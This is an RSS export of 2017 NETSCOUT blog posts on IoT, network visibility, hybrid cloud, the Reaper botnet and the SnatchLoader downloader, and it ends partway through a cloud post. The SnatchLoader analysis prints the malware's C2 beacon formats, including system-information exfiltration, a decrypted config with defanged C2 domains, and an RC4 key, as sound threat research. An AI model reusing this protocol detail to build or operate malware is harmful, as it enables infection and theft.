<p>The smart bottle features a printed sensor tag made with OpenSense technology from <a href="http://www.thinfilm.no/" target="_blank">Thinfilm Electronics</a>. It can detect the sealed and opened state of each bottle. OpenSense uses smartphones' Near Field Communication (NFC) capabilities, allowing Diageo to send personalized communications to consumers who read the tags with their smartphones.</p>

<p>Venky Balakrishnan Iyer, global vice president of digital innovation at Diageo, says that while Diageo owns very traditional brands (many of them are 300 or 400 years old), there's a large amount of digital interaction happening with those brands.</p>

<p>"These are people standing in stores or bars and wondering whether they buy the single malt or the blend, highland, or lowland," Balakrishnan says.</p>

<p>Diageo sees millions of searches about its brands occurring, and more than 50 percent happen via mobile within a few feet of the bottle on the shelf. The smart bottle is an attempt to facilitate and shape that interaction.</p>

<p>That interaction doesn’t end once the bottle has been opened.</p>

<p>"We know the bottle opening event has occurred," Balakrishnan says. "Our communication can change from guiding the consumer on which bottle to buy to how to best enjoy this product."</p>

<p>The sensor tag also has an application in the supply chain. The tags allow tracking of products across the supply chain, in-store and to the point of consumption. The sensor tags remain readable even when the factory seal has been broken. This provides an additional layer of security to protect the authenticity of the product.</p>

<p>&nbsp;</p>

<p class="nc_attribution_text">This article was written by Thor Olavsrud from <a href="https://www.cio.com/article/3229671/internet-of-things/10-internet-of-things-success-stories.html" target="_blank">CIO</a> and was legally licensed through the <a href="https://www.newscred.com/" target="_blank">NewsCred</a> publisher network. Please direct all licensing questions to <a href="mailto:legal@newscred.com">legal@newscred.com</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/2020-01/09/images/Zz0wY2MwMGUzMmZiNjFlMDUwZTAzNTU4OGY5ZjI2ZTRlNQ.jpg" length="304894" type="image/jpeg"/>
    <guid isPermaLink="false">71396671-c24a-44ce-851d-3327981093b3</guid>
    <pubDate>Mon, 30 Oct 2017 16:34:33 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Software-driven Disaggregation Comes to Network Visibility</title>
  <link>http://localhost:7996/blog/software-driven-disaggregation-comes-network-visibility</link>
  <description>With NETSCOUT the adoption of software-defined networking and disaggregation of switch hardware and operating system software promises much in simplicity, automation, orchestration, rapid provisioning and customer choice.</description>
  <content:encoded><![CDATA[<div style="background-color: #F5F5F5;margin: 20px 0 20px;padding: 20px;border: 1px solid #DDDDDD;"><img src="http://localhost:7996/sites/default/files/Duffy_Jim.jpg" style="float:left;margin-right:15px;max-width:100px;" /><strong><em>Written by Jim Duffy</em></strong><br />
Jim Duffy is a Senior Analyst for the Networking Channel at 451 Research. He covers enterprise network infrastructure and associated software, and network performance management. Jim has been covering technology for over 30 years, including 25 at Network World. His coverage focused predominantly on enterprise networking infrastructure, including routers, switches, and associated software.</div>

<p>The adoption of software-defined networking and disaggregation of switch hardware and operating system software promises much in the way of simplicity, automation, orchestration, rapid provisioning and customer choice. Indeed, recent surveys conducted by 451 Research indicate that a chief driver of software enablement in networking is faster response to business needs, followed by improved availability and reliability, decreased cost and enhanced security.</p>

<p><strong><em>Software-driven networks breed complexity</em></strong></p>

<p>But for all of the operational ease that the software-driven disaggregation promises, there’s still some complexity inherent in scaling out the technology across the enterprise. This is readily evident in one particular networking discipline: visibility.</p>

<p>Creating a visibility infrastructure for a large-scale network can be just as complex as the network itself. Depending on the size of the network, the visibility infrastructure may require hundreds of packet brokers and switches to instrument the network for monitoring, management and insight into performance, and to forward packets to the appropriate analysis and security tools when necessary.</p>

<p><strong><em>The need for visibility fabric management</em></strong></p>

<p>Just as a large-scale network can benefit from a fabric-based architecture of finely orchestrated elements, so too can a large-scale visibility infrastructure. In an ideal world, by weaving packet brokers into a software-driven fabric, individual or groups of packet brokers could be deployed and scaled rapidly in just a few mouse clicks from the GUI of a single central management station.</p>

<p>This central fabric manager would easily organize complex resources and configurations – such as switches, ports and filters – provide intuitive configuration of traffic flow topologies, and allow for deployment of new switches or topology designs in minutes. &nbsp;It would provide a user--based easy and natural logical grouping of the major functions in building and operating the visibility infrastructure: configuration, deployment and monitoring. This manager would allow for simple definition and deployment of filters, topologies, topology changes, and granular monitoring of the status of physical components and their attributes, and of traffic flows.</p>

<p><strong><em>Key requirements</em></strong></p>

<p>Consider the following questions when planning future visibility deployments:</p>

<ul>
	<li>How would the fabric management system help you with triage and troubleshooting?</li>
	<li>What will the time to deployment be?</li>
	<li>What is the process of creating the network visibility topologies?</li>
	<li>How would the packet broker infrastructure scale?</li>
</ul>

<p>In short, the fabric manager should drive out operational complexity and reduce time so that visibility into the network itself can be achieved in short order. The same uniform workflow to operate a large-scale, software-driven network can also benefit a large-scale visibility infrastructure comprised of hundreds of disaggregated, software-driven packet brokers. This is the power of software. And it’s not just for networks anymore.</p>

<p>Applying the same principles of network disaggregation to network visibility should reap the same benefits – simplicity, automation, orchestration, rapid provisioning and customer choice. This, in turn, should produce the same results: faster response to business needs, improved availability and reliability, decreased cost and enhanced security. The more agile and responsive the visibility infrastructure, the more agile, responsive and secure the network. And the benefits to the overall business are obvious.</p>

<p><em>~&nbsp;Jim Duffy, Senior Analyst for the Networking Channel, 451 Research</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/pfs_0.jpg" length="216625" type="image/jpeg"/>
    <guid isPermaLink="false">b9216265-7a6a-4bdc-a69a-b7dca9a5cb14</guid>
    <pubDate>Mon, 30 Oct 2017 13:00:00 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>AI, IoT, and the hybrid cloud</title>
  <link>http://localhost:7996/blog/ai-iot-and-hybrid-cloud</link>
  <description>Cloud/IoT/AI implementations can vary widely by industry, and some sectors are more advanced than others. Use cases include Smart Agriculture, Intelligent Construction (heavy equipment), Connected Manufacturing, and Connected Healthcare. The world of IoT and AI platforms is young and in flux, with known and unknown companies offering solutions. It does not take much of an...</description>
  <content:encoded><![CDATA[<p>Information technology systems of the future are increasingly focused on where data is generated and processed, how it’s delivered and collected, and how quickly this data can move. Finding the most efficient path is key.</p>

<p>Two of the most significant trends are the internet of things (IoT) and artificial intelligence (AI), which fit together like hand in glove. In a very simple form, IoT is about a multitude of devices exchanging data from a multitude of data points, which are being collected in a plethora of ways and on a plethora of platforms. That data must be quickly analyzed and in most cases, sent to the next level for further processing.</p>

<p>Meanwhile, AI is about programmatically manipulating this big data to make real-time and time-sensitive decisions. The only way to build for this technological union is with a hybrid multicloud platform. The elements of hybrid IT infrastructure providing the most efficient path for AI and IoT form the foundation of technologies that will spark business advantages, innovation, and the “cloud of clouds” of the future.</p>

<p><strong>IoT and the edge of computing</strong></p>

<p>There are devices all around us that are collecting, distributing, and processing data at what is considered the edge of the modern enterprise and the consumer space. Even further, all of this data must be quickly analyzed, collected, and transferred in space that is beyond the realm of immediate control.</p>

<p>This level of effort requires incredible distributed collection and storage requirements that are closest to the source. This means that the IoT edge and all the computing events that occur in these systems are a focal point for automation and other emerging trends. These elements are the main catalyst for further innovations in computing architecture of the future, due to the ongoing growth of the edge through the proliferation of increasingly intelligent and interactive devices.</p>

<p>The edge of IoT must exhibit instantaneous transactions, without central controls, through distributed connections that can validate, create, and tear down connections. At the very least, the basic principles set limits on how far data can be moved before latency begins to create operational issues. How far is the edge, the actually feasible edge?</p>

<p>Working together, the logic behind it all is AI. Data life cycles, flow, data classifications, reporting, and countless aspects of IoT are dictated by the intelligence of AI.</p>

<p><strong>AI everywhere</strong></p>

<p>AI is not some self-aware robot, as Hollywood movies would like us to believe, but it can seem like it’s straight out of science fiction. At this point, AI technology is far beyond the initial phase of hype and to find it you must recognize that these technologies are designed to learn, adapt, recognize patterns, and mimic human intelligence at scale. All you have to do is look at the self-driving vehicles out there—from autonomous cars to auto-pilot on planes—with the amazing intelligent split-second decisions they are able to make.</p>

<p>AI and IoT are symbiotic, and it is critical to understand the relationship between them. AI calls for an immense order of computing power to operate, and in many cases, this need can only be served via bare-metal compute power. Speed and performance are key, as life and death decisions can hang in the balance. Further, decisions made by AI engines need to be fed back quickly and accurately to the IoT devices. Examples of this include:</p>

<ul>
	<li>Self-driving autopilot systems that detect life-saving conditions such as floods, rerouting traffic, and alerting to avoid accidents</li>
	<li>Medical devices that can automatically defibrillate and send a 911 signal to the nearest hospital</li>
	<li>Automated agricultural combines that can avoid a loose animal or a herd and alert a farmer</li>
	<li>Credit card fraud detection</li>
	<li>On-demand recommendations that come from video services</li>
	<li>Apple’s Siri technology and Amazon’s Echo ecosystem making super-rapid decisions that are manifested at the endpoint</li>
</ul>

<p>The list goes on and on. You can see in those examples that AI requirements call not only for speed, they call for lots of data, and AI systems will programmatically manipulate oceans of data to make real-time decisions. AI endeavors to deliver programmatic reasoning, self-correction and ultimately learning. In the enterprise, the potential advantages and benefits are unlimited.</p>

<p>Among these capabilities, AI can:</p>

<ul>
	<li>Help reduce human errors across the organization</li>
	<li>Manage large amounts of data</li>
	<li>Improve the work processes of staff</li>
	<li>Support the digital transformation of a business</li>
	<li>Significantly help to deliver a seamless customer experience</li>
</ul>

<p>AI technologies are increasingly being introduced through third-party software and capabilities within existing software tools. AI and IoT designs are becoming the blueprint for the enterprise.</p>

<p><strong>Hybrid multicloud disruption</strong></p>

<p>The merger of IoT and AI is simply not possible without an enabling platform and architecture. That’s where the hybrid multicloud steps in. All companies, even those in the same line of business, exhibit unique technology DNA that has been built for and suited to their individual business needs and growth. Hybrid multicloud is a disruptive technology development and a business opportunity. To understand this disruption requires an understanding of the relationship between hybrid, IoT, and AI.</p>

<p>Among the most critical of advantages that hybrid cloud platforms provide for IoT-AI environments are:</p>

<ul>
	<li>Various forms of storage&nbsp;­ Custom-tailored for AI and IoT constructs, hybrid clouds can feature various tiers of storage such as real-time, archival, redundant, distributed, etc. No single cloud can do this. Stored data can be accessed quickly and programmatically by the AI engine, and enriched over time through machine learning. For example, one could use AWS S3 storage for archival and off-premise SAN storage for high-performance needs.</li>
	<li>Rapid processing of information and rapid enrichment of data through correlation of various sources for AI: Data processing runs fastest on bare metal, where there is a minimal amount of barriers, and hops between this core and the raw processing power of servers. A bare-metal server farm remains the most optimal construct for AI processing.</li>
	<li>Customized security to the application: Securing the application is a critical enterprise mission, especially in centralized scenarios. Recent security breaches in the news were tied back to the poor usage of AWS systems, allowing for the exposure of private information. Many of the procedural gaps at the root of these and other incidents can be tracked to knowledge gaps, training and technology. Core hybrid data processing allows for enterprise controls, reporting, and auditing constructs that are not simply used in public cloud environments.</li>
	<li>Hybrid: cloud unlimited</li>
</ul>

<p>We live in an age where somehow, somewhere, the cloud seemingly processes every interaction, transaction, and communication. Nearly every application in the world uses the cloud as its integration fabric. The information systems of tomorrow will become more focused on real-time experiences across an increasingly widening range of devices. Under the old rules, such as Moore’s Law, broadband growth, and other linear trends that defined the computer services industry, innovation could only deliver along the boundaries of time. That’s not the case anymore, thanks to hybrid cloud technologies.</p>

<p>IoT, AI, and hybrid cloud are three sides to the same triangle, three legs to the same stool—the holy trinity of IT. Together, these forces have elevated data as the core of modern-day application innovations. The future for this world of applications is unlimited. Hybrid cloud is not just a platform. It is built of strategy, as a leading technology solution, as an architectural marvel, and most importantly, as a promise to build into the future.</p>

<p>&nbsp;</p>

<p class="nc_attribution_text">This article was written by Emil Sayegh from <a href="https://www.infoworld.com/article/3232356/internet-of-things/ai-iot-and-the-hybrid-cloud-the-triumvirate-of-its-future.html" target="_blank">InfoWorld</a> and was legally licensed through the <a href="https://www.newscred.com/" target="_blank">NewsCred</a> publisher network. Please direct all licensing questions to <a href="mailto:legal@newscred.com">legal@newscred.com</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/2021-01/04/images/hybrid-cloud-word-cloud.jpg" length="337115" type="image/jpeg"/>
    <guid isPermaLink="false">d575136f-656b-45f8-bf49-cd59fb72ddb8</guid>
    <pubDate>Fri, 27 Oct 2017 13:00:00 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Reaper Madness</title>
  <link>http://localhost:7996/blog/asert/reaper-madness</link>
  <description>On October 19th, a team of security researchers warned of a new IoT Botnet that had already infected “an estimated million organizations” and that was poised to “take down the internet”. This report was subsequently picked up by the press and spread quickly via social media. ASERT has been actively analyzing the Reaper IoT botnet; The current actual size of the Reaper botnet...</description>
  <content:encoded><![CDATA[<p>On October 19<sup>th</sup>, a team of security <a href="https://research.checkpoint.com/new-iot-botnet-storm-coming/">researchers</a>&nbsp;warned of a new IoT Botnet that had already infected “an estimated million organizations” and that was poised to “take down the internet”. This report was subsequently picked up by the press and spread quickly via social media. ASERT has been actively analyzing the Reaper&nbsp;IoT botnet;</p>

<ul>
	<li>The current actual size of the&nbsp;Reaper botnet tends to fluctuate between 10,000 - 20,000 bots in total&nbsp;(although this could change at any time).</li>
	<li>An additional 2 million hosts have been identified by the botnet scanners as potential Reaper nodes, but have not been subsumed into the botnet.</li>
</ul>

<p>At this time, it is not clear why these candidate bots have not been co-opted into the botnet. Possible explanations include: misidentification due to flaws in the scanning code, scalability/performance issues in the Reaper code injection infrastructure, or a deliberate decision by the Reaper botmasters to throttle back the propagation mechanism.</p>

<ul>
	<li>Our current assessment of Reaper is that it is likely intended for use as a booter/stresser service primarily serving the intra-China DDoS-for-hire market.</li>
	<li>Reaper appears to be a product of the Chinese criminal underground; some of the general Reaper code is based on the&nbsp;<a href="http://asert.arbornetworks.com/mirai-iot-botnet-description-ddos-attack-mitigation/">Mirai</a> IoT malware, but it is not an outright Mirai clone.</li>
	<li>While Reaper is capable of launching SYN-floods, ACK-floods, http floods, and DNS reflection/amplification attacks, it is likely to have other, yet-to-be-determined DDoS attack capabilities, as well.</li>
</ul>

<p>ASERT will continue to analyze the botnet malware and monitor for any signs of attack. In the meantime, Chinese internet security company Qihoo has published some interesting analysis of the Reaper IoT bot:</p>

<ul>
	<li><a href="http://blog.netlab.360.com/iot_reaper-a-rappid-spreading-new-iot-botnet-en/">http://blog.netlab.360.com/iot_reaper-a-rappid-spreading-new-iot-botnet…</a></li>
	<li><a href="http://blog.netlab.360.com/iot_reaper-a-few-updates-en/">http://blog.netlab.360.com/iot_reaper-a-few-updates-en/</a></li>
</ul>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <guid isPermaLink="false">912d5974-571d-46b7-b9ab-ca1bfbd82737</guid>
    <pubDate>Thu, 26 Oct 2017 09:42:29 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>SnatchLoader Reloaded</title>
  <link>http://localhost:7996/blog/asert/snatchloader-reloaded</link>
  <description>Executive Summary SnatchLoader is a “downloader” malware—a type of malware that specializes in distributing (or loading) other malware onto infected computers. We first started seeing it in the wild around January 2017, but after a few months it went dormant. Recently, development of the malware has picked up again and we’ve seen updates as recently as last week. It is...</description>
  <content:encoded><![CDATA[<p><strong>Executive Summary</strong></p>

<p>SnatchLoader is a “downloader” malware—a type of malware that specializes in distributing (or loading) other malware onto infected computers. We first started seeing it in the wild around January 2017, but after a few months it went dormant. Recently, development of the malware has picked up again and we’ve seen updates as recently as last week. It is currently being used to load a banking trojan known as Ramnit. Additionally, it’s using an interesting feature known as “geo-IP blocking” so that only computers in certain geographical areas become infected. We have been able to determine that at a minimum the UK and Italy are being targeted, but the US, France, and Hong Kong are not.</p>

<p><strong>Introduction</strong></p>

<p>There was an interesting <a href="https://twitter.com/dvk01uk/status/898431354873851904">Twitter thread</a> a couple of months ago about <a href="https://myonlinesecurity.co.uk/your-order-no-8194788-has-been-processed-malspam-delivers-malware/">a spam campaign</a> delivering, at the time, an unknown “downloader” malware—a type of malware that specializes in distributing other malware families. Based on our analysis we believe that it is an update to the downloader known as “SnatchLoader” which was briefly discussed on the KernelMode.info forum in January 2017 . As noted in that post, there seems to be some similarities between SnatchLoader and a third family known as <a href="http://asert.arbornetworks.com/flu-season-starting-early-the-h1n1-loader/">H1N1 Loader</a>—though a detailed code comparison was not performed. Its lineage aside, we haven’t seen any further discussions of SnatchLoader, so this post takes a look at the latest version that we’ve seen.</p>

<p><strong>Samples</strong></p>

<p>The sample referenced in the original Twitter thread is available on <a href="https://www.virustotal.com/en/file/41e698c7f1febdb53b9b7eae0f48fd93949602d0631d6f6b7dc0768958f7107a/analysis/">VirusTotal</a>. However, most of our static analysis was performed on an updated version of the “core DLL” with a compilation date of 2017-10-04. This DLL is also on <a href="https://www.virustotal.com/en/file/075420f10a1b4fc7302c5e95e578e8397b93019acc0f7f018dc7453a9266e17e/analysis/">VirusTotal</a> and was first seen there on 2017-10-11.</p>

<p><strong>Windows API Calls</strong></p>

<p>All calls to the Windows API are done at run time via function name hashing. The hashing algorithm is a combination of rotate left (ROL) and XOR operations. An example implementation in Python can be found <a href="https://github.com/tildedennis/malware/blob/master/snatch_loader/api_hash.py">on GitHub</a>. Here is a list of some API function names and their corresponding hashes:</p>

<ul><li>RtlZeroMemory -&gt; 0x6b6c652b</li>
	<li>CreateMutexW -&gt; 0x43725043</li>
	<li>InternetConnectA -&gt; 0x1d0c0b3e</li>
</ul><p><strong>Static Config</strong></p>

<p>A static config is stored encrypted in a PE section of the DLL--so far, we’ve seen two names for this section: .idata and .xdata.:</p>

<p><img alt="The first DWORD" data-entity-type="file" data-entity-uuid="dafd5025-8bdd-4f94-96f2-b102a4b9981b" src="http://localhost:7996/sites/default/files/inline-images/The%20first%20DWORD.png" /></p>

<p>The first DWORD of this section (0x99a8 in the screenshot) is used as a seed to a key generation function.</p>

<p>A Python implementation of this function is available <a href="https://github.com/tildedennis/malware/blob/master/snatch_loader/decrypt_cfg.py">on GitHub</a>. The generated key is used with RC4 to decrypt the remaining data. The decrypted config can be separated into two chunks. The first chunk is XML-like and looks like this (whitespace has been added for readability):</p>

<p><img alt="SRV is the command and control " data-entity-type="file" data-entity-uuid="4a04f839-78ec-42de-a8cf-1e4f4f0d5b85" src="http://localhost:7996/sites/default/files/inline-images/SRV%20is%20the%20command%20.png" /><br /><img /> SRV is the command and control (C2) URL, TIME is the phone home poll interval in minutes, NAME is a campaign identifier (02.10 likely means October 2nd), and KEY is used to encrypt phone home communications. The second config chunk is an RSA certificate used for signature checking of downloaded data.</p>

<p><strong>Command and Control</strong></p>

<p>So far, all the C2 URLs we’ve observed are HTTPS. However, using a debugger, we can modify the communications to use HTTP and see what a phone home looks like in plaintext:</p>

<p><a href="http://asert.arbornetworks.com/snatchloader-reloaded/http_comms/" rel="attachment wp-att-9295"><img alt="The POST data is encrypted" src="http://localhost:7996/sites/default/files/inline-images/The%20POST%20data%20is%20encrypted.png" /><img alt="" class="alignnone wp-image-9295" data-entity-type="file" data-entity-uuid="1e67c36e-985b-407d-82c5-09682ad55882" height="420" src="http://localhost:7996/sites/default/files/inline-images/The%20POST%20data%20is%20encrypted.png" width="675" /></a> The POST data is encrypted using four layers:</p>

<ol><li>RC4 using KEY from the config</li>
	<li>Base64</li>
	<li>Character substitutions</li>
	<li>Split up into 64-byte chunks with “\r\n” delimiters</li>
</ol><p>There are three character substitutions and they are reversible:</p>

<ul><li>+ to –</li>
	<li>/ to _</li>
	<li>. to =</li>
</ul><p>The response data is encrypted similarly but without layer 4. Communications are broken up into four request types:</p>

<ol><li>Get dynamic config</li>
	<li>Send system information</li>
	<li>Command poll</li>
	<li>Send command results</li>
</ol><p><strong>Get Dynamic Config Request</strong></p>

<p>The plain text version of the “get dynamic config” request looks like this:</p>

<pre>
<strong>req=0&amp;guid=FCD08AEE3C0E9409&amp;name=02.10&amp;trash=ulbncmamlxwjakbnbmaklvvhamathrgsfrpbsfrfqeqpatisgsfrqbtfrgqfrpbuithtisrctisgsfrqbujtiuistduith</strong></pre>

<p>Its pieces are:</p>

<ul><li>req – request type</li>
	<li>guid – bot ID</li>
	<li>name – NAME from static config</li>
	<li>trash – random characters of random length</li>
</ul><p>An example response looks like this:</p>

<pre>
<strong>SUCCESS|&lt;CFG&gt;&lt;SRV&gt;https://lookmans[.]eu/css/order.php|https://vertasikupper[.]eu/css/order.php&lt;/SRV&gt;&lt;TIME&gt;120&lt;/TIME&gt;&lt;NAME&gt;02.10&lt;/NAME&gt;&lt;KEY&gt;547bnw47drtsb78d3&lt;/KEY&gt;&lt;/CFG&gt;|</strong></pre>

<p>This response can be separated into two fields: the status field and the data portion. Here the status field is “SUCCESS” and the data portion is encapsulated in the “&lt;CFG&gt; block”—this config is called the DYNAMIC config in the code.</p>

<p><strong>Send System Information Request</strong></p>

<p>The second phone home request sends a bunch of system information and it looks like this:</p>

<pre>
<strong>req=1&amp;guid=FCD08AEE3C0E9409&amp;name=02.10&amp;win=9&amp;x64=1&amp;adm=1&amp;det=0&amp;def=0&amp;nat=1&amp;usrn=SYSTEM&amp;cmpn=JOHN-PC&amp;uagn=Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&amp;sftl=AddressBook|Connection Manager|DirectDrawEx|Fontcore|IE40|IE4Data|IE5BAKEX|IEData|MobileOptionPack|SchedulingAgent|WIC|&amp;prcl=[System Process]\r\nSystem\r\nsmss.exe\r\ncsrss.exe\r\nwininit.exe\r\ncsrss.exe\r\nwinlogon.exe\r\nservices.exe\r\nlsass.exe\r\nlsm.exe\r\nsvchost.exe\r\nVBoxService.exe\r\nsvchost.exe\r\nsvchost.exe\r\nsvchost.exe\r\nsvchost.exe\r\naudiodg.exe\r\nsvchost.exe\r\nsvchost.exe\r\nspoolsv.exe\r\nsvchost.exe\r\ntaskhost.exe\r\nsvchost.exe\r\ndwm.exe\r\nexplorer.exe\r\nVBoxTray.exe\r\nSearchIndexer.exe\r\nwmpnetwk.exe\r\nsvchost.exe\r\nsppsvc.exe\r\nsvchost.exe\r\nmscorsvw.exe\r\nmscorsvw.exe\r\nSearchProtocolHost.exe\r\nmsiexec.exe\r\nsvchost.exe\r\nTrustedInstaller.exe\r\ntaskhost.exe\r\nSearchFilterHost.exe\r\nmsiexec.exe\r\ndllhost.exe\r\ndllhost.exe\r\nmsiexec.exe\r\nsvchost.exe\r\n&amp;trash=ilnyyiittddnoyyiblambllvwgblalakjvufynamblcmambllwugxlwkwjvu\r\n</strong></pre>

<p>Its pieces are:</p>

<ul><li>req – request type</li>
	<li>guid – bot ID</li>
	<li>name – NAME from the config</li>
	<li>win – Windows version</li>
	<li>x64 – is 64-bit architecture</li>
	<li>adm – is admin</li>
	<li>det – anti-analysis related</li>
	<li>def – anti-analysis process name detected</li>
	<li>nat – has an RFC1918 IP address</li>
	<li>usrn – username</li>
	<li>cmpn – computer name</li>
	<li>uagn – user agent</li>
	<li>sftl – software listing from the Uninstall key in the registry</li>
	<li>prcl – process listing</li>
	<li>trash – random characters of random length</li>
</ul><p>A response looks like this:</p>

<pre>
<strong>SUCCESS|</strong></pre>

<p><strong>Command Poll Request</strong></p>

<p>A command poll request looks like the “get dynamic config” request except the req number is 2. An example response looks like this:</p>

<pre>
<strong>SUCCESS|&lt;TASK&gt;20|1|2||MZ...\x00\x00&lt;/TASK&gt;|</strong></pre>

<p>This response has two fields with the first being a status field and the second field being the data portion. The data here can be zero or more TASK blocks with the following fields:</p>

<ul><li>task ID</li>
	<li>command type</li>
	<li>command arg1 (e.g. file type)</li>
	<li>command arg2 (e.g. hash value)</li>
	<li>command data (e.g. an executable file or URL)</li>
</ul><p>The main functionality of SnatchLoader is to download and load additional malware families so most of the command types and arguments are in support of doing that in various ways (executed normally, executed via rundll32, or injected into explorer.exe). In this example, the command is to extract the embedded executable file and execute it normally. Some of the other supported commands are:</p>

<ul><li>Plugin functionality (so far, we’ve only seen <a href="https://www.virustotal.com/#/file/142753b36c6fc9b29ba5f2ca3464e42c7fa1f70c7d165c7d446f2ab58a66a9b9/detection">a Monero crypto currency mining plugin</a>)</li>
	<li>Update config</li>
	<li>Update self</li>
</ul><p><strong>Send Command Results Request</strong></p>

<p>The last phone home type is used to send the results of a command:</p>

<pre>
<strong>req=3&amp;guid=FCD08AEE3C0E9409&amp;name=02.10&amp;results=&amp;trash=pffebxmawlawigdawkifcymbxmawlgebxlawkifcymbxmhebymbxlawkifcy</strong></pre>

<p>It is similar to the “command poll” request except the req number is 3 and an additional parameter (results) has been added. There is no response content from the C2 for this request.</p>

<p><strong>Geo-Blocking and Current Payload</strong></p>

<p>An interesting characteristic of the C2 servers we’ve looked at so far is that they seem to be performing some sort of geo-blocking based on source IP addresses. While trying to interact with them via TOR or VPN exit nodes in the US, France, or Hong Kong the servers responded with “404 Not found” errors. But, using VPN exit nodes in the UK and Italy, the C2 responded affirmatively. In general, geo-blocking isn’t a novel feature, but it isn’t particularly common. At the time of writing, the analyzed SnatchLoader botnet was distributing Ramnit—an info stealing and banking malware. It has a compilation date of 2017-10-13 and is available on <a href="https://www.virustotal.com/en/file/789c129a7d5815d81e324a065a8a50091b25f6e9d9f24d4a34cd2f0e2abdaa8d/analysis/">VirusTotal</a>.</p>

<p><strong>Conclusion</strong></p>

<p>This post has been an overview of a downloader malware known as SnatchLoader. We can trace its origins as far back as January 2017 and it has been updated as recently as last week. It is being delivered via spam campaigns and based on geo-blocking functionality it looks to be targeting specific geographical areas. At the time of writing SnatchLoader is distributing the Ramnit malware family to at least the UK and Italy. Thanks much to <a href="https://twitter.com/Antelox">Antelox</a>, <a href="https://twitter.com/reOnFleek">reOnFleek</a>, <a href="https://twitter.com/XOR_Hex">XOR_Hex</a>, <a href="https://twitter.com/mesa_matt">mesa_matt</a>, and <a href="https://twitter.com/kafeine/">kafeine</a> for help with the geo-IP blocking, distributed payload, name origin, and general discussions on the family.  </p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/login-768x438.png" length="115666" type="image/png"/>
    <guid isPermaLink="false">5f320589-903c-44e5-9425-0bfe6d098a24</guid>
    <pubDate>Wed, 25 Oct 2017 14:01:32 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>Managing Complexity in the Cloud</title>
  <link>http://localhost:7996/blog/managing-complexity-cloud</link>
  <description>As modern computing evolves, companies may need to adjust their language, talking of clouds, rather than the cloud. Most organizations these days have been moving to multi-cloud environments that better support unique operating requirements. That move creates an additional layer of IT infrastructure complexity, though. How can they deal with a collection of cloud environments...</description>
  <content:encoded><![CDATA[<p>As modern computing evolves, companies may need to adjust their language, talking of clouds, rather than the cloud. Most organizations these days have been moving to multi-cloud environments that better support unique operating requirements. That move creates an additional layer of IT infrastructure complexity, though. How can they deal with a collection of cloud environments and assure service and application reliability, availability and responsiveness?</p>

<p>Software as a Service (SaaS) company&nbsp;RightScale interviewed over 1,000 IT professionals in 2017 to ask them about their approach to cloud computing. Its resulting <a href="https://www.rightscale.com/lp/state-of-the-cloud" target="_blank">2017 State of the Cloud</a> report found that 85 percent of respondents now spread their IT operations over multiple clouds rather than one.</p>

<p>Companies use multiple cloud infrastructures for varying reasons. One part of the company may have developed its systems on Microsoft, making it a candidate for Azure, while another may have stuck with Linux, making an alternative cloud service provider more appropriate.&nbsp;Other options include AWS virtual private cloud, or even a mixture of hybrid public/private cloud, using a product like VMware Cloud for AWS, which extends the on-premises data center into the cloud.</p>

<p style="text-align: center;"><img alt="Zz00Yjk1NmUyNWE5YWFlYjIzNDViNDU1Y2VjZjY1MTk2Nw==.jpeg" height="322" src="https://images2.newscred.com/Zz1lNTI2MGU4ZTQxMTg2NmI2ZDk2ZTI3MmJkY2E4NGUwOQ==" width="537.4912505335041" /></p>

<p>One application set may be best suited to a cloud service that offers fast parallel processing, while another may focus on simple cloud storage. In scenarios like these, a company may use different providers with their own capabilities and cost models.</p>

<p>In any case, multi-cloud environments are rarely entirely cloud-native. Legacy IT systems take time to depreciate and migrate as business constraints force companies to recover sunk investments, and technical migrations involving architectural changes and software refactoring take time. Some applications and data may simply be too sensitive or performance-dependent to take off site at all, making a hybrid cloud environment with an on-premise computing component necessary.</p>

<p>This creates a challenge for CIOs: how can they monitor services and assure performance across multiple infrastructure components?</p>

<p>Cloud service providers offer their own operational views, but these are typically siloed. The issue is retaining visibility and control over apps and workloads that span multi-cloud and hybrid infrastructures.&nbsp;To scale simply and maintain performance, businesses need a service assurance and security strategy built on a platform of pervasive visibility. When done right, applications perform as expected and service delivery results in user or customer experiences that not only delight, but are flawless.&nbsp;One way to handle this is by continuously monitoring wire data, aggregating it into actionable intelligence that can rapidly pinpoint service and application performance problems anywhere in the hybrid infrastructure.</p>

<div>
<div>
<div>
<h2><strong>A Joined-Up View of IT Virtualized Services</strong></h2>

<p>Cloud computing can supercharge IT innovation, enabling companies to introduce new products and services at higher velocity, but it brings its own complexity and performance challenges. Companies need a robust service assurance solution that can provide end-to-end visibility across an entire multi-cloud architecture, enabling operations teams to keep up with the fast pace of continuous deployment.&nbsp;</p>
</div>
</div>
</div>

<p style="text-align: center;"><img alt="undefined" height="322" src="https://images3.newscred.com/Zz0xODI4MzYyYzE1OGIxYjVmYTA0MDg2NzQ5OGIxOWI2Mg==" width="512.7681118881119" /></p>

